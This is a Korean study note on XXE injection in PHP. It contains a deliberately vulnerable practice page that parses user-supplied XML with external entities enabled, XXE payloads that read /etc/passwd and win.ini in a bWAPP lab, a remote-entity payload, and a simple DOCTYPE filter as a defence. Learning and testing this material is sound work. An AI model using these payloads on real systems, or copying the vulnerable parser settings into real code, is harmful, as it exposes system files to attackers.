### XXE

일반적으로 잘못 구성된 XML Parser 를 사용하여 신뢰할 수 없는 XML 공격 코드을 주입시켜 실행시키는 응용 프로그램에 대한 공격

해당 공격을 통해서 주요 시스템 파일 접근(LFI)이나 외부 악의 적인 파일 참조(RFI)가 가능

보통 XML Parser 설정에서 External Entity 사용을 금지시키지 않아 발생 

### PHP 설정

xmlrpc 확장을 활성화 한다.

libxml_disable_entity_loader(false);

allow_url_fopen = on

allow_url_include = on

### 실습 가능 코드

<pre><code>
[XEE.PHP]
＜html>
＜body>
＜meta charset='utf-8'/>
＜?php
if (function_exists('libxml_disable_entity_loader')) {
    libxml_disable_entity_loader(false);
}
$xml=$_POST['xml'];
if($xml){
$doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
}
?>
＜form method="post">
＜textarea name="xml" rows="12" cols="100">
＜?php
echo $xml;
?>
＜/textarea>
＜input type="submit">
＜/form>
＜?php
echo $doc;
?>
＜/html>
</code></pre>

상기 코드를 저장하고 아래 내용을 textarea에 입력해 테스트 해본다.

<pre><code>
＜!DOCTYPE test[
＜!ENTITY testtest "XXE SUCCESS">
]>
＜result>&testtest;＜/result>
</code></pre>

from http://securitynote.tistory.com/4
https://stackoverflow.com/questions/29811915/external-entities-not-working-in-simplexml

방어코드
<pre><code>
if(preg_match("/＜!DOCTYPE/i", $xml))
{
	throw new InvalidArgumentException('Invalid XML: Detected use of illegal DOCTYPE');
}
</code></pre>

from http://blog.naver.com/PostView.nhn?blogId=koromoon&logNo=120208853424&parentCategoryNo=&categoryNo=15&viewDate=&isShowPopularPosts=false&from=postView

### LFI(Local File Inclusion)

bWAPP에서 실습하기 위해서는 WINDOWS는 문제 없지만, Linux에서는 코드를 약간 수정한다.

$doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);

<pre><code>
＜!DOCTYPE root [
＜!ENTITY bWAPP SYSTEM "file:///windows/win.ini">
]>＜reset>＜login>&bWAPP;＜/login>＜secret>Any bugs?＜/secret>＜/reset>
</code></pre>

<pre><code>
＜!DOCTYPE test[
＜!ENTITY testtest SYSTEM "file:///etc/passwd">
]>
＜result>&testtest;＜/result>
</code></pre>

### RFI(Remote File Inclusion)

<pre><code>
＜!DOCTYPE root [
＜!ENTITY bWAPP SYSTEM "http://원격주소">
]>＜result>&bWAPP;＜/result>
</code></pre>

### 참고사이트

The HackPot : XML External Enitity (XXE) Injection

http://thehackpot.blogspot.com/2014/05/xml-external-enitity-xxe-injection.html?m=1
